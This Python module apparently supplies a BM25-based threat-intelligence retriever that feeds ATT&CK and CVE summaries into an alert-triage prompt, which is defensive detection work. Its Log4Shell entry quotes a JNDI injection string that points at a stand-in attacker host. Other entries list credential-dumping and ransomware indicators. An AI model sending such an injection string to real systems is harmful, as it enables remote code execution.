"""
Threat Intelligence RAG Module

Lightweight BM25-based retriever over a curated dataset of:
  - Common CVE descriptions (SSH, web, RDP, database vulnerabilities)
  - MITRE ATT&CK technique summaries (Initial Access, Persistence, Lateral Movement, etc.)
  - Common alert patterns and their known severities

No embedding models, no external API, no vector DB service needed.
BM25 is pure Python + NumPy -- fast, free, works offline.

Usage:
    from app.agents.threat_intel import retriever
    context = retriever.retrieve("failed SSH login attempts from unusual IP", top_k=3)
    # Returns a list of relevant threat strings to inject into the Triage prompt.
"""

import re
from rank_bm25 import BM25Okapi

# ---------------------------------------------------------------------------
# Threat knowledge base
# Each entry is a dict with:
#   id       - short identifier
#   text     - full description used for retrieval + context
#   severity - high/med/low guidance
# ---------------------------------------------------------------------------
THREAT_KB = [
    # ---- SSH / Remote Access -----------------------------------------------
    {
        "id": "T1110-brute-force",
        "text": (
            "MITRE ATT&CK T1110 - Brute Force: Adversaries use brute force to gain "
            "access. SSH brute force involves repeated failed login attempts from a "
            "single or rotating IP. High volume of authentication failures within a "
            "short time window is a strong indicator. Severity: HIGH if >10 attempts "
            "in 60s, MED if spread over longer periods."
        ),
        "severity": "high",
    },
    {
        "id": "CVE-2023-38408",
        "text": (
            "CVE-2023-38408 - OpenSSH ssh-agent remote code execution. Affects OpenSSH "
            "before 9.3p2. An attacker can achieve RCE if a victim's ssh-agent is "
            "forwarded to an attacker-controlled server. CVSS 9.8 CRITICAL. "
            "Indicators: SSH agent forwarding enabled, connections to untrusted hosts."
        ),
        "severity": "high",
    },
    {
        "id": "CVE-2024-6387-regresshion",
        "text": (
            "CVE-2024-6387 - regreSSHion: OpenSSH server RCE vulnerability in glibc-based "
            "Linux. Unauthenticated remote code execution as root. Affects OpenSSH < 4.4p1 "
            "and 8.5p1-9.7p1. CVSS 8.1 HIGH. Indicator: port 22 exposed to internet, "
            "version banner showing vulnerable range."
        ),
        "severity": "high",
    },

    # ---- Web / HTTP --------------------------------------------------------
    {
        "id": "T1190-exploit-public-app",
        "text": (
            "MITRE ATT&CK T1190 - Exploit Public-Facing Application: Adversaries exploit "
            "weaknesses in internet-facing software. Common patterns: SQL injection, "
            "command injection, path traversal, SSRF. Web application firewall alerts, "
            "unusual HTTP payloads (quotes, semicolons, '../'), 400/500 error spikes "
            "from a single IP. Severity: HIGH for RCE payloads, MED for injection probes."
        ),
        "severity": "high",
    },
    {
        "id": "CVE-2021-44228-log4shell",
        "text": (
            "CVE-2021-44228 - Log4Shell: Critical RCE in Apache Log4j 2 via JNDI injection. "
            "Attacker sends ${jndi:ldap://attacker.com/a} in any logged field. CVSS 10.0. "
            "Indicators: ${jndi: in HTTP headers/params, outbound LDAP/DNS to unknown hosts, "
            "Log4j version 2.0-2.14.1 in use."
        ),
        "severity": "high",
    },
    {
        "id": "T1059-command-scripting",
        "text": (
            "MITRE ATT&CK T1059 - Command and Scripting Interpreter: Adversaries use scripts "
            "to execute commands post-compromise. PowerShell, bash, Python execution from "
            "web server processes is highly suspicious. Look for web server spawning cmd/sh, "
            "encoded commands (base64), outbound connections immediately after script execution."
        ),
        "severity": "high",
    },

    # ---- Lateral Movement --------------------------------------------------
    {
        "id": "T1021-remote-services",
        "text": (
            "MITRE ATT&CK T1021 - Remote Services: Adversaries use valid accounts to log "
            "into services like RDP, SMB, SSH for lateral movement. Indicators: login to "
            "internal hosts outside business hours, new admin account used across multiple "
            "hosts in short period, RDP from non-admin workstations."
        ),
        "severity": "high",
    },
    {
        "id": "T1078-valid-accounts",
        "text": (
            "MITRE ATT&CK T1078 - Valid Accounts: Adversaries use compromised credentials "
            "to bypass access controls. Indicators: login from unusual geography, login at "
            "unusual hours, account used on multiple systems simultaneously, successful login "
            "after many failures (successful brute force)."
        ),
        "severity": "med",
    },

    # ---- Exfiltration / Data -----------------------------------------------
    {
        "id": "T1041-exfil-c2",
        "text": (
            "MITRE ATT&CK T1041 - Exfiltration Over C2 Channel: Data exfiltrated over the "
            "same channel used for C2. Large outbound data volume, DNS tunneling (unusually "
            "long subdomains), HTTPS traffic to newly registered domains. Severity HIGH."
        ),
        "severity": "high",
    },
    {
        "id": "T1530-s3-data-from-cloud",
        "text": (
            "MITRE ATT&CK T1530 - Data from Cloud Storage: Adversaries access data from "
            "misconfigured S3 buckets or cloud storage. Public S3 bucket with sensitive data, "
            "unusual GetObject calls from external IPs, bucket policy allowing AllUsers read. "
            "Severity: HIGH for public exposure of sensitive data."
        ),
        "severity": "high",
    },

    # ---- Privilege Escalation ----------------------------------------------
    {
        "id": "T1068-privilege-escalation",
        "text": (
            "MITRE ATT&CK T1068 - Exploitation for Privilege Escalation: Adversaries exploit "
            "OS or software vulnerabilities to gain higher privileges. Indicators: process "
            "running as root unexpectedly, sudo abuse, SUID binary execution, kernel exploit "
            "patterns. Severity: HIGH."
        ),
        "severity": "high",
    },
    {
        "id": "CVE-2021-4034-polkit",
        "text": (
            "CVE-2021-4034 - PwnKit: Local privilege escalation in polkit pkexec. Any "
            "unprivileged user can gain root. Affects all major Linux distros with polkit. "
            "CVSS 7.8 HIGH. Indicator: pkexec executed by non-root, unexpected root processes "
            "spawned from user sessions."
        ),
        "severity": "high",
    },

    # ---- Ransomware / Malware ----------------------------------------------
    {
        "id": "T1486-ransomware",
        "text": (
            "MITRE ATT&CK T1486 - Data Encrypted for Impact (Ransomware): Adversaries encrypt "
            "data to extort victims. Indicators: mass file rename/extension change, vssadmin "
            "delete shadows, rapid file I/O across many directories, ransom note files, "
            "outbound traffic to TOR. Severity: CRITICAL."
        ),
        "severity": "high",
    },

    # ---- Configuration / Compliance ----------------------------------------
    {
        "id": "CONFIG-open-sg",
        "text": (
            "Misconfigured Security Group: AWS Security Group allowing inbound 0.0.0.0/0 on "
            "sensitive ports (22/SSH, 3389/RDP, 3306/MySQL, 5432/Postgres, 6379/Redis, "
            "27017/MongoDB). Exposes services directly to the internet. Severity: HIGH for "
            "database ports, MED for SSH/RDP with key-based auth enforced."
        ),
        "severity": "high",
    },
    {
        "id": "CONFIG-public-s3",
        "text": (
            "Misconfigured S3 Bucket: S3 bucket with public ACL (AllUsers Read or FullControl) "
            "or bucket policy allowing Principal=*. Any internet user can list/download contents. "
            "Severity: HIGH if bucket contains PII, credentials, or source code; MED for "
            "intentionally public static assets."
        ),
        "severity": "high",
    },

    # ---- Benign / Noise patterns -------------------------------------------
    {
        "id": "BENIGN-maintenance",
        "text": (
            "Scheduled maintenance and system events: planned downtime, certificate renewals, "
            "routine patch scans, automated backup jobs. These generate alerts in monitoring "
            "tools but are expected and pre-approved. Severity: LOW. Usually safe to dismiss "
            "if matching a known maintenance window."
        ),
        "severity": "low",
    },
    {
        "id": "BENIGN-vuln-scanner",
        "text": (
            "Authorized vulnerability scanner or penetration test traffic: port scans, "
            "banner grabs, credential stuffing from known scanner IPs (Qualys, Tenable, "
            "Rapid7). High volume but from pre-approved source. Severity: LOW if source "
            "is whitelisted, HIGH if unknown."
        ),
        "severity": "low",
    },

    # ---- Denial of Service -------------------------------------------------
    {
        "id": "T1498-network-dos",
        "text": (
            "MITRE ATT&CK T1498 - Network Denial of Service: Adversaries perform DoS attacks "
            "to degrade availability. Indicators: traffic spike (Gbps or MPPS), SYN flood, "
            "UDP amplification, connection exhaustion. Severity: HIGH during active attack, "
            "impacts availability of services."
        ),
        "severity": "high",
    },

    # ---- Credential theft --------------------------------------------------
    {
        "id": "T1003-credential-dumping",
        "text": (
            "MITRE ATT&CK T1003 - OS Credential Dumping: Adversaries dump credentials from "
            "OS or software to obtain account login information. Mimikatz, LSASS memory access, "
            "SAM database read, /etc/shadow access. Severity: HIGH -- indicates active "
            "post-exploitation activity."
        ),
        "severity": "high",
    },

    # ---- Port scanning / recon ---------------------------------------------
    {
        "id": "T1046-network-scan",
        "text": (
            "MITRE ATT&CK T1046 - Network Service Discovery: Adversaries scan for open ports "
            "and running services to map the network. Indicators: sequential port sweep, "
            "connection attempts to many hosts/ports in short time, nmap-like patterns. "
            "Severity: MED during active intrusion, LOW for external internet scanners."
        ),
        "severity": "med",
    },
]


# ---------------------------------------------------------------------------
# BM25 retriever
# ---------------------------------------------------------------------------

def _tokenize(text: str) -> list[str]:
    """Lowercase + split on non-alphanumeric. Simple but effective for BM25."""
    return re.findall(r"[a-z0-9]+", text.lower())


class ThreatIntelRetriever:
    def __init__(self, kb: list[dict]):
        self._kb = kb
        tokenized = [_tokenize(entry["text"]) for entry in kb]
        self._bm25 = BM25Okapi(tokenized)

    def retrieve(self, query: str, top_k: int = 3) -> list[str]:
        """Return the top_k most relevant threat intel snippets for this query."""
        scores = self._bm25.get_scores(_tokenize(query))
        top_indices = sorted(range(len(scores)), key=lambda i: scores[i], reverse=True)[:top_k]
        results = []
        for i in top_indices:
            if scores[i] > 0:
                entry = self._kb[i]
                results.append(f"[{entry['id']}] {entry['text']}")
        return results

    def retrieve_as_context(self, query: str, top_k: int = 3) -> str:
        """Return retrieved threats formatted as a prompt context block."""
        hits = self.retrieve(query, top_k=top_k)
        if not hits:
            return ""
        lines = "\n".join(f"- {h}" for h in hits)
        return (
            f"Relevant threat intelligence (use this to inform your classification):\n{lines}"
        )


# Singleton — built once at import time, reused for every Triage call.
retriever = ThreatIntelRetriever(THREAT_KB)
